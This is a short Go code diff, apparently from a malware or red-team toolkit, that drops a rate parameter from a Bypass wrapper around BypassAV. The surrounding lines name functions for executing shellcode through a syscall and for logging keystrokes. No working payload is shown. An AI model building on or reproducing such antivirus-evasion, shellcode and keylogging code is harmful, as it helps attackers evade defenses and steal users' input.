@@ -178,8 +178,8 @@ func SysShellExec(shellcode []byte) {
 	SyscallExecute(shellcode)
 }
 
-func Bypass(rate int) {
-	BypassAV(rate)
+func Bypass() {
+	BypassAV()
 }
 
 func logKeys(logLocal *string) {
